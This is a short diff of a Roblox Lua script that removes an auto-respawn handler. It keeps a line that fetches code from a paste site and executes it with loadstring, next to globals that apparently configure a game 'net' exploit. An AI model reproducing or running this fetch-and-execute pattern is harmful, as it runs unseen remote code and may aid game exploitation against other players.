@@ -9,15 +9,6 @@
 local NetEnabled = true
 loadstring(game:HttpGet('https://paste.ee/r/HRAcR'))()
 
-game.Players.PlayerAdded:connect(function(plr)
-    plr.CharacterAdded:connect(function(chr)
-        repeat wait() until chr.Humanoid
-        chr.Humanoid.Died:connect(function()
-            plr.LoadCharacter()
-         end)
-    end)
-end)
-
 
 _G.PowerfulNet = true
 _G.Jitteryness = Vector3.new(25,0,0)
